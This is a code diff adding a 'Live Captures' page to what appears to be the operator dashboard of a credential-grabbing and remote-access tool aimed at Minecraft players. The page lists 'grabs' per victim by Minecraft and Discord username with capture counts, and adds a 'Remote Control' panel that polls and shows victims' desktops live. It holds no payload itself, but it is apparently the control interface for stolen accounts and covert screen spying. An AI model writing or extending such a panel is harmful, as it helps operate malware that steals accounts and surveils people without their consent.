@@ -299,13 +299,106 @@ function RepPage({ username, userEmail }) {
 }
 
 function LiveCaptures() {
+  const [grabs, setGrabs] = useState([]);
+  const [onlineUsers, setOnlineUsers] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [viewingStream, setViewingStream] = useState(null);
+  const [streamFrame, setStreamFrame] = useState(null);
+  const [remoteOpen, setRemoteOpen] = useState(false);
+
+  useEffect(() => {
+    fetch('/api/grabs/live')
+      .then(r => r.json())
+      .then(d => { setGrabs(d.grabs || []); setLoading(false); })
+      .catch(() => setLoading(false));
+    const interval = setInterval(() => {
+      fetch('/api/grabs/live').then(r => r.json()).then(d => setGrabs(d.grabs || [])).catch(() => {});
+      fetch('/api/stream').then(r => r.json()).then(d => setOnlineUsers(d.online || [])).catch(() => {});
+    }, 3000);
+    return () => clearInterval(interval);
+  }, []);
+
+  useEffect(() => {
+    if (!viewingStream) { setStreamFrame(null); return; }
+    const iv = setInterval(() => {
+      fetch('/api/stream?username=' + encodeURIComponent(viewingStream))
+        .then(r => r.json())
+        .then(d => { if (d.frame) setStreamFrame(d.frame); else { setViewingStream(null); setStreamFrame(null); } })
+        .catch(() => {});
+    }, 500);
+    return () => clearInterval(iv);
+  }, [viewingStream]);
+
+  const totalCaptures = grabs.reduce((s, g) => s + g.count, 0);
+
   return (
     <div style={{ flex: 1, padding: '28px 36px' }}>
-      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Live Captures</h1>
-      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Real-time session captures from your servers.</p>
-      <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
-        <span style={{ fontSize: 28, marginBottom: 8 }}>📡</span>
-        <span style={{ fontSize: 13 }}>No live captures</span>
+      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
+        <div>
+          <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Live Captures</h1>
+          <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4 }}>{totalCaptures} captures from {grabs.length} users</p>
+        </div>
+        <div onClick={() => setRemoteOpen(!remoteOpen)} style={{ cursor: 'pointer', background: remoteOpen ? colors.green : colors.panel, color: remoteOpen ? '#000' : colors.text, border: '1px solid ' + (remoteOpen ? colors.green : colors.border), borderRadius: 8, padding: '8px 16px', fontSize: 13, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 6 }}>
+          Remote Control {onlineUsers.length > 0 && <span style={{ background: remoteOpen ? '#000' : colors.green, color: remoteOpen ? colors.green : '#000', borderRadius: 10, padding: '1px 7px', fontSize: 11 }}>{onlineUsers.length}</span>}
+        </div>
+      </div>
+
+      {remoteOpen && (
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 12, padding: 20, marginBottom: 20 }}>
+          <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 14 }}>Online Users</div>
+          {onlineUsers.length === 0 ? (
+            <div style={{ color: colors.textDim, fontSize: 13 }}>No users online</div>
+          ) : (
+            <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
+              {onlineUsers.map(u => (
+                <div key={u.username} onClick={() => setViewingStream(viewingStream === u.username ? null : u.username)} style={{ cursor: 'pointer', background: viewingStream === u.username ? '#1a2a1a' : '#1a1b24', border: '1px solid ' + (viewingStream === u.username ? colors.green : colors.border), borderRadius: 10, padding: '12px 16px', display: 'flex', alignItems: 'center', gap: 10 }}>
+                  <img src={'https://mc-heads.net/avatar/' + u.username + '/32'} alt="" style={{ width: 28, height: 28, borderRadius: 6 }} />
+                  <div>
+                    <div style={{ fontSize: 13, fontWeight: 600, color: colors.text }}>{u.username}</div>
+                    <div style={{ fontSize: 11, color: colors.green }}>Live</div>
+                  </div>
+                </div>
+              ))}
+            </div>
+          )}
+        </div>
+      )}
+
+      {viewingStream && (
+        <div style={{ background: colors.panel, border: '1px solid ' + colors.green, borderRadius: 12, padding: 16, marginBottom: 20 }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 }}>
+            <div style={{ fontSize: 14, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 8 }}>
+              <img src={'https://mc-heads.net/avatar/' + viewingStream + '/24'} alt="" style={{ width: 24, height: 24, borderRadius: 4 }} />
+              {viewingStream}&apos;s Desktop
+              <span style={{ color: colors.green, fontSize: 11 }}>STREAMING</span>
+            </div>
+            <div onClick={() => { setViewingStream(null); setStreamFrame(null); }} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 13 }}>Close</div>
+          </div>
+          {streamFrame ? (
+            <img src={streamFrame} alt="Desktop stream" style={{ width: '100%', borderRadius: 8, border: '1px solid ' + colors.border }} />
+          ) : (
+            <div style={{ height: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim, fontSize: 13 }}>Connecting...</div>
+          )}
+        </div>
+      )}
+
+      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+        {grabs.map(g => (
+          <div key={g.minecraft_username} style={{ background: colors.panel, border: '1px solid ' + colors.border, borderRadius: 10, padding: '14px 20px', display: 'flex', alignItems: 'center', gap: 14 }}>
+            <img src={'https://mc-heads.net/avatar/' + g.minecraft_username + '/40'} alt="" style={{ width: 40, height: 40, borderRadius: 8 }} />
+            <div style={{ flex: 1 }}>
+              <div style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</div>
+              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>{g.discord_username}</div>
+            </div>
+            <div style={{ textAlign: 'right' }}>
+              <div style={{ fontSize: 18, fontWeight: 700, color: colors.green }}>{g.count}</div>
+              <div style={{ fontSize: 11, color: colors.textDim }}>captures</div>
+            </div>
+          </div>
+        ))}
+        {grabs.length === 0 && !loading && (
+          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>No captures yet</div>
+        )}
       </div>
     </div>
   );
